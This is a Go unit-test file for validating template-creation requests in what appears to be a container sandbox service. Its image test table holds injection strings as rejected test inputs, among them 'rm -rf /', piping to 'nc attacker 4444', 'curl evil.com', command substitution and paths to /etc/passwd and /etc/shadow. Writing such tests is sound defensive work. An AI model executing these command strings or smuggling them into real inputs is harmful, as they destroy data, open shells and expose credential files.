package templates

import (
	"errors"
	"strings"
	"testing"
)

// validRequest returns a request that passes validation, so each test can
// mutate exactly one field and attribute any failure to that field.
func validRequest() CreateTemplateRequest {
	return CreateTemplateRequest{
		Slug:        "valid-template",
		Name:        "Valid Template",
		Description: "A template that passes validation",
		Category:    "testing",
		Image:       "python:3.12-slim",
		Resources: ResourceConfig{
			CPULimit:       1.0,
			MemoryLimitMB:  512,
			TimeoutSeconds: 600,
		},
		Network: NetworkConfig{Enabled: false},
	}
}

func TestValidateAcceptsValidRequest(t *testing.T) {
	if err := validRequest().Validate(); err != nil {
		t.Fatalf("Validate() = %v, want nil for a valid request", err)
	}
}

// TestValidateRejectsMaliciousImages covers the case the security report
// claimed was handled but was not: a template image is handed to the Docker
// daemon, so URLs, traversal and shell metacharacters must be refused.
func TestValidateRejectsMaliciousImages(t *testing.T) {
	images := []struct {
		name  string
		image string
	}{
		{"http URL", "http://evil.example.com/image"},
		{"https URL", "https://evil.example.com/image"},
		{"file URL", "file:///etc/passwd"},
		{"docker URL", "docker://evil/image"},
		{"path traversal", "../../etc/passwd"},
		{"traversal in path", "registry.io/../../etc/shadow"},
		{"command substitution", "python:3.12$(whoami)"},
		{"backtick substitution", "python:3.12`id`"},
		{"semicolon chain", "python:3.12;rm -rf /"},
		{"pipe", "python:3.12|nc attacker 4444"},
		{"ampersand", "python:3.12&&curl evil.com"},
		{"redirect", "python:3.12>/etc/passwd"},
		{"newline", "python:3.12\nFROM evil"},
		{"space", "python:3.12 --privileged"},
		{"NUL byte", "python:3.12\x00evil"},
		{"single quote", "python:3.12'"},
		{"empty", ""},
	}

	for _, tc := range images {
		t.Run(tc.name, func(t *testing.T) {
			req := validRequest()
			req.Image = tc.image

			err := req.Validate()
			if err == nil {
				t.Fatalf("Validate() = nil for image %q, want error", tc.image)
			}
			if !errors.Is(err, ErrInvalidTemplate) {
				t.Errorf("Validate() error = %v, want it to wrap ErrInvalidTemplate", err)
			}
		})
	}
}

func TestValidateAcceptsLegitimateImages(t *testing.T) {
	images := []string{
		"python",
		"python:3.12",
		"python:3.12-slim",
		"node:20-alpine",
		"ghcr.io/nickvd7/vaultrun:latest",
		"registry.example.com:5000/team/app:v1.2.3",
		"vaultrun/browser:playwright-python",
		"ubuntu@sha256:0000000000000000000000000000000000000000000000000000000000000000",
	}

	for _, image := range images {
		t.Run(image, func(t *testing.T) {
			req := validRequest()
			req.Image = image

			if err := req.Validate(); err != nil {
				t.Errorf("Validate() = %v for legitimate image %q, want nil", err, image)
			}
		})
	}
}

// TestValidateRejectsBadResourceLimits covers the boundary values: zero and
// negative limits would produce a container the daemon refuses or that has no
// limit at all, and absurdly large ones can exhaust the host.
func TestValidateRejectsBadResourceLimits(t *testing.T) {
	cases := []struct {
		name      string
		resources ResourceConfig
	}{
		{"zero CPU", ResourceConfig{CPULimit: 0, MemoryLimitMB: 512, TimeoutSeconds: 600}},
		{"negative CPU", ResourceConfig{CPULimit: -1, MemoryLimitMB: 512, TimeoutSeconds: 600}},
		{"CPU above max", ResourceConfig{CPULimit: MaxCPULimit + 1, MemoryLimitMB: 512, TimeoutSeconds: 600}},
		{"zero memory", ResourceConfig{CPULimit: 1, MemoryLimitMB: 0, TimeoutSeconds: 600}},
		{"negative memory", ResourceConfig{CPULimit: 1, MemoryLimitMB: -512, TimeoutSeconds: 600}},
		{"memory above max", ResourceConfig{CPULimit: 1, MemoryLimitMB: MaxMemoryLimitMB + 1, TimeoutSeconds: 600}},
		{"zero timeout", ResourceConfig{CPULimit: 1, MemoryLimitMB: 512, TimeoutSeconds: 0}},
		{"negative timeout", ResourceConfig{CPULimit: 1, MemoryLimitMB: 512, TimeoutSeconds: -600}},
		{"timeout above max", ResourceConfig{CPULimit: 1, MemoryLimitMB: 512, TimeoutSeconds: MaxTimeoutSeconds + 1}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := validRequest()
			req.Resources = tc.resources

			if err := req.Validate(); err == nil {
				t.Errorf("Validate() = nil for %s, want error", tc.name)
			}
		})
	}
}

func TestValidateAcceptsBoundaryResourceLimits(t *testing.T) {
	req := validRequest()
	req.Resources = ResourceConfig{
		CPULimit:       MaxCPULimit,
		MemoryLimitMB:  MaxMemoryLimitMB,
		TimeoutSeconds: MaxTimeoutSeconds,
	}

	if err := req.Validate(); err != nil {
		t.Errorf("Validate() = %v at exact maximums, want nil", err)
	}
}

// TestValidateRejectsBadSlugs matters because the slug is used as a URL path
// segment in GET /templates/slug/:slug.
func TestValidateRejectsBadSlugs(t *testing.T) {
	slugs := []struct {
		name string
		slug string
	}{
		{"empty", ""},
		{"uppercase", "Invalid-Slug"},
		{"path traversal", "../etc/passwd"},
		{"slash", "foo/bar"},
		{"leading hyphen", "-leading"},
		{"trailing hyphen", "trailing-"},
		{"double hyphen", "double--hyphen"},
		{"space", "has space"},
		{"underscore", "has_underscore"},
		{"url encoded traversal", "%2e%2e%2f"},
		{"too long", strings.Repeat("a", MaxSlugLength+1)},
		{"NUL byte", "slug\x00"},
	}

	for _, tc := range slugs {
		t.Run(tc.name, func(t *testing.T) {
			req := validRequest()
			req.Slug = tc.slug

			if err := req.Validate(); err == nil {
				t.Errorf("Validate() = nil for slug %q, want error", tc.slug)
			}
		})
	}
}

// TestValidateRejectsBadAllowedHosts: an entry of "*" or a URL would widen
// network access beyond what the author intended.
func TestValidateRejectsBadAllowedHosts(t *testing.T) {
	cases := []struct {
		name  string
		hosts []string
	}{
		{"wildcard", []string{"*"}},
		{"URL", []string{"https://github.com"}},
		{"with path", []string{"github.com/nickvd7"}},
		{"empty entry", []string{"github.com", ""}},
		{"whitespace", []string{"github.com evil.com"}},
		{"newline", []string{"github.com\nevil.com"}},
		{"too many", make([]string, MaxAllowedHosts+1)},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := validRequest()
			req.Network = NetworkConfig{Enabled: true, AllowedHosts: tc.hosts}

			if err := req.Validate(); err == nil {
				t.Errorf("Validate() = nil for hosts %v, want error", tc.hosts)
			}
		})
	}
}

func TestValidateRejectsBadEnvVarNames(t *testing.T) {
	cases := []struct {
		name string
		env  map[string]string
	}{
		{"empty name", map[string]string{"": "value"}},
		{"leading digit", map[string]string{"1INVALID": "value"}},
		{"hyphen", map[string]string{"IN-VALID": "value"}},
		{"space", map[string]string{"IN VALID": "value"}},
		{"equals sign", map[string]string{"KEY=EXTRA": "value"}},
		{"newline", map[string]string{"KEY\nOTHER": "value"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := validRequest()
			req.Environment = tc.env

			if err := req.Validate(); err == nil {
				t.Errorf("Validate() = nil for env %v, want error", tc.env)
			}
		})
	}
}

// Env var values may contain arbitrary bytes — a secret or a JSON blob is
// legitimate — so only names are constrained.
func TestValidateAcceptsArbitraryEnvValues(t *testing.T) {
	req := validRequest()
	req.Environment = map[string]string{
		"JSON_CONFIG": `{"key": "value", "nested": {"a": 1}}`,
		"WITH_QUOTES": `it's a "value"`,
		"WITH_SEMI":   "a;b;c",
		"EMPTY":       "",
	}

	if err := req.Validate(); err != nil {
		t.Errorf("Validate() = %v for legitimate env values, want nil", err)
	}
}

func TestValidateRejectsOversizedStartupScript(t *testing.T) {
	req := validRequest()
	req.StartupScript = strings.Repeat("x", MaxStartupScript+1)

	if err := req.Validate(); err == nil {
		t.Error("Validate() = nil for oversized startup_script, want error")
	}
}

// TestValidateReportsAllProblems: callers building templates programmatically
// need every problem at once, not one per round trip.
func TestValidateReportsAllProblems(t *testing.T) {
	req := CreateTemplateRequest{
		Slug:        "Invalid Slug",
		Name:        "",
		Description: "",
		Category:    "",
		Image:       "file:///etc/passwd",
		Resources:   ResourceConfig{CPULimit: -1, MemoryLimitMB: 0, TimeoutSeconds: 0},
	}

	err := req.Validate()
	if err == nil {
		t.Fatal("Validate() = nil for a request with many problems, want error")
	}

	msg := err.Error()
	for _, want := range []string{"slug", "name", "description", "category", "image"} {
		if !strings.Contains(msg, want) {
			t.Errorf("Validate() error %q does not mention %q", msg, want)
		}
	}
}

// TestUpdateValidateSkipsOmittedFields: a partial update must not be rejected
// for a field the caller did not send.
func TestUpdateValidateSkipsOmittedFields(t *testing.T) {
	name := "New Name"
	req := UpdateTemplateRequest{Name: &name}

	if err := req.Validate(); err != nil {
		t.Errorf("Validate() = %v for a name-only update, want nil", err)
	}
}

func TestUpdateValidateChecksProvidedFields(t *testing.T) {
	badImage := "file:///etc/passwd"
	req := UpdateTemplateRequest{Image: &badImage}

	if err := req.Validate(); err == nil {
		t.Error("Validate() = nil for an update with a file:// image, want error")
	}
}

// TestBuiltInTemplatesPassValidation guards against shipping a built-in
// template that the API would reject if a user submitted it.
func TestBuiltInTemplatesPassValidation(t *testing.T) {
	for _, tmpl := range BuiltInTemplates {
		t.Run(tmpl.Slug, func(t *testing.T) {
			req := CreateTemplateRequest{
				Slug:          tmpl.Slug,
				Name:          tmpl.Name,
				Description:   tmpl.Description,
				Category:      tmpl.Category,
				Tags:          tmpl.Tags,
				Image:         tmpl.Image,
				Version:       tmpl.Version,
				Resources:     tmpl.Resources,
				Network:       tmpl.Network,
				Environment:   tmpl.Environment,
				Policy:        tmpl.Policy,
				Packages:      tmpl.Packages,
				Readme:        tmpl.Readme,
				StartupScript: tmpl.StartupScript,
			}

			if err := req.Validate(); err != nil {
				t.Errorf("built-in template %q fails validation: %v", tmpl.Slug, err)
			}
		})
	}
}
